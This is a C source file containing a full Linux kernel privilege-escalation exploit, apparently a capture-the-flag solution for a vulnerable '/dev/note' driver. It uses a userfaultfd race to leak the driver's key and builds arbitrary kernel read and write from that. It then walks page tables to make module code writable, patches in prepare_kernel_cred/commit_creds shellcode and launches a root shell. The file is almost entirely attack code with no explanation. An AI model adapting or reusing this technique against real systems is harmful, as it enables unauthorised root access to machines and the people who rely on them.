#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <sys/prctl.h>



void commit_creds_and_return() {
	asm volatile ("xor %rdi, %rdi");
	asm volatile ("mov $0xcccccccccccccccc, %rax");
	asm volatile ("call %rax");
	asm volatile ("mov %rax, %rdi");
	asm volatile ("mov $0xdddddddddddddddd, %rax");
	asm volatile ("call %rax");
}


#define ADDR_FAULT 0xdead000

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)


int fd;
unsigned long long cmd[3];


void init_notes(int fd) {
    // puts("[+] Initialize notes");
    ioctl(fd, -253, cmd);
}

void view_note(int fd, unsigned long long index, void *buf) {
    // printf("[+] View %lld\n", index);
    cmd[0] = index;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -254, cmd);
}

void edit_note(int fd, unsigned long long index, void *buf) {
    // printf("[+] Edit %lld\n", index);
    cmd[0] = index;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -255, cmd);
}

void add_note(int fd, unsigned long long size, void *buf) {
    // printf("[+] Add size %lld\n", size);
    cmd[0] = 0; // index
    cmd[1] = size;
    cmd[2] = (unsigned long long)buf;
    ioctl(fd, -256, cmd);
}

unsigned long long read64_offset(int fd, unsigned long long offset, unsigned long long key) {
    unsigned long long buf[0x100];

    memset(buf, 0, sizeof(buf));
    buf[2] = 0; // key
    buf[3] = 0xff ^ key; // size
    buf[4] = offset ^ key; // offset
    edit_note(fd, 1, buf);

    memset(buf, 0, sizeof(buf));
    view_note(fd, 2, buf);
    return buf[0] ^ key;
}


void readff(int fd, unsigned long long addr, unsigned long long buf[], unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long wbuf[0x100];
    memset(wbuf, 0, sizeof(wbuf));
    wbuf[2] = 0; // key
    wbuf[3] = 0xff ^ key;
    wbuf[4] = (addr - page_offset_base) ^ key;
    edit_note(fd, 1, wbuf);

    view_note(fd, 2, buf);
    int i;
    for (i = 0; i < 0xf0 / 8; ++i) {
        buf[i] ^= key;
    }
}

unsigned long long read64(int fd, unsigned long long addr, unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long buf[0x100];
    memset(buf, 0, sizeof(buf));
    readff(fd, addr, buf, key, page_offset_base);
    return buf[0];
}


void write64(int fd, unsigned long long addr, unsigned long long data, unsigned long long key, unsigned long long page_offset_base) {
    unsigned long long buf[0x100];

    memset(buf, 0, sizeof(buf));
    buf[2] = 0;
    buf[3] = 0x8 ^ key;
    buf[4] = (addr - page_offset_base) ^ key;
    edit_note(fd, 1, buf);

    unsigned long long enc_data = data ^ key;
    edit_note(fd, 2, &enc_data);
}


void writeLen(int fd, unsigned long long addr, char data[], unsigned long long key, unsigned long long page_offset_base, unsigned long long size) {
    unsigned long long buf[0x100];

    memset(buf, 0, sizeof(buf));
    buf[2] = 0;
    buf[3] = size ^ key;
    buf[4] = (addr - page_offset_base) ^ key;
    edit_note(fd, 1, buf);

    memcpy(buf, data, 0xf0);
    int i;
    for (i = 0; i < 0xf0 / 8; ++i) {
        buf[i] ^= key;
    }
    edit_note(fd, 2, buf);
}


static void *fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    unsigned long long ubuf[128];

    uffd = (long) arg;

    for (;;) {
        /* See what poll() tells us about the userfaultfd */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        /* Read an event from the userfaultfd */
        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }
        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        printf("[+] Handle userfaultfd at 0x%llx\n", msg.arg.pagefault.address);

        memset(ubuf, 0, sizeof(ubuf));
        init_notes(fd);
        add_note(fd, 0x10, ubuf);
        add_note(fd, 0x10, ubuf);

        /* We need to handle page faults in units of pages(!).
           So, round faulting address down to page boundary */
        ubuf[0] = 0;
        ubuf[1] = 0;
        ubuf[2] = 0;
        ubuf[3] = 0xff;

        // uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
        //     ~(page_size - 1);
        uffdio_copy.dst = ADDR_FAULT;
        uffdio_copy.src = (__u64)ubuf;
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        break;
    }
    return NULL;
}


pthread_t config_userfaultfd(void) {
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    uint64_t len;       /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    len = 0x1000;
    addr = mmap((void *)ADDR_FAULT, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr != (char *)ADDR_FAULT)
        errExit("mmap");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    return thr;
}


#define ADDR(pte) (((((pte) << 11) >> 11) >> 12) << 12)


unsigned long long walk_pgdir(unsigned long long pgd, unsigned long long va, unsigned long long page_offset_base, unsigned long long key) {
    unsigned long long l4_offset, l3_offset, l2_offset, l1_offset, phys_offset;
    l4_offset = va >> 39 & 0x1ff;
    l3_offset = va >> 30 & 0x1ff;
    l2_offset = va >> 21 & 0x1ff;
    l1_offset = va >> 12 & 0x1ff;
    phys_offset = va & 0xfff;

    unsigned long long pdp, pdt, pt, page, tmp;
    tmp = read64(fd, pgd + l4_offset * 8, key, page_offset_base);
    pdp = ADDR(tmp) + page_offset_base;

    tmp = read64(fd, pdp + l3_offset * 8, key, page_offset_base);
    pdt = ADDR(tmp) + page_offset_base;

    tmp = read64(fd, pdt + l2_offset * 8, key, page_offset_base);
    pt = ADDR(tmp) + page_offset_base;

    tmp = read64(fd, pt + l1_offset * 8, key, page_offset_base);
    page = ADDR(tmp) + page_offset_base;

    unsigned long long addr_pte = pt + l1_offset * 8;
    return addr_pte;
}


int main(void) {
    fd = open("/dev/note", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    unsigned long long buf[1024];
    memset(buf, 0, sizeof(buf));

    add_note(fd, 0x20, buf);

    pthread_t thr;
    thr = config_userfaultfd();
    edit_note(fd, 0, (void *)ADDR_FAULT);

    pthread_join(thr, NULL);

    view_note(fd, 1, buf);
    unsigned long long key;

    key = buf[2];
    printf("[+] key = 0x%llx\n", key);

    memset(buf, 0, sizeof(buf));
    add_note(fd, 0x10, buf); // 2

    view_note(fd, 1, buf);
    unsigned long long offset_chunk2 = buf[4] ^ key;
    unsigned long long offset_table = offset_chunk2 + 0x1f98;
    printf("[+] offset_chunk2 = 0x%llx\n", offset_chunk2);
    printf("[+] offset_table = 0x%llx\n", offset_table);

    unsigned long long addr_chunk0 = read64_offset(fd, offset_table, key);
    unsigned long long addr_module = addr_chunk0 - 0x2520;
    unsigned long long addr_chunk2 = addr_chunk0 + 0x50 + 0x18;
    unsigned long long page_offset_base = addr_chunk2 - offset_chunk2;
    unsigned long long addr_call_copy_from_user = addr_module + 0x6c;
    printf("[+] addr_chunk2 = 0x%llx\n", addr_chunk2);
    printf("[+] addr_module = 0x%llx\n", addr_module);
    printf("[+] page_offset_base = 0x%llx\n", page_offset_base);
    printf("[+] addr_call_copy_from_user = 0x%llx\n", addr_call_copy_from_user);

    puts("[!] Leak kernel address");
    int offset_copy_from_user = read64(fd, addr_call_copy_from_user + 1, key, page_offset_base) & 0xffffffff;
    unsigned long long addr_copy_from_user = addr_module + 0x71 + (unsigned long long)offset_copy_from_user;
    unsigned long long addr_kernel = addr_copy_from_user - 0x77ff81353e80;
    printf("[+] offset_copy_from_user = 0x%x\n", offset_copy_from_user);
    printf("[+] addr_copy_from_user = 0x%llx\n", addr_copy_from_user);
    printf("[+] addr_kernel = 0x%llx\n", addr_kernel);

    // Reverse engineering will reveal that the secret key
    // is the address of page directory table.
    // https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html
    unsigned long long pgd = key;

    unsigned long long addr_pte = walk_pgdir(pgd, addr_module, page_offset_base, key);
    unsigned long long pte = read64(fd, addr_pte, key, page_offset_base);
    printf("[+] addr_pte = 0x%llx\n", addr_pte);
    printf("[+] pte = 0x%llx\n", pte);
    write64(fd, addr_pte, pte | 2, key, page_offset_base);

    char shellcode[0x1000];
    memcpy(shellcode, commit_creds_and_return, 0xff);
    unsigned long long addr_commit_creds = addr_kernel + 0x77ff810ac680;
    unsigned long long addr_prepare_kernel_cred = addr_kernel + 0x77ff810ac950;
    	for(int i = 0; i < 0xff; i++) {
		unsigned long *pppp = &shellcode[i];
		if (*pppp == 0xcccccccccccccccc) {
			printf("[*] patched prepare_kernel_cred\n");
			*pppp = addr_prepare_kernel_cred;
		}
		if (*pppp == 0xdddddddddddddddd) {
			printf("[*] patched commit_creds\n");
			*pppp = addr_commit_creds;
		}
	}

    writeLen(fd, addr_module + 0x400, shellcode, key, page_offset_base, 0xff);
	writeLen(fd, addr_module, "\xe8\xf9\x03\x00\x00\x31\xc0\xc3", key, page_offset_base, 0x8);
	open("/dev/note", O_RDONLY);
	system("/bin/sh");

    return 0;
}
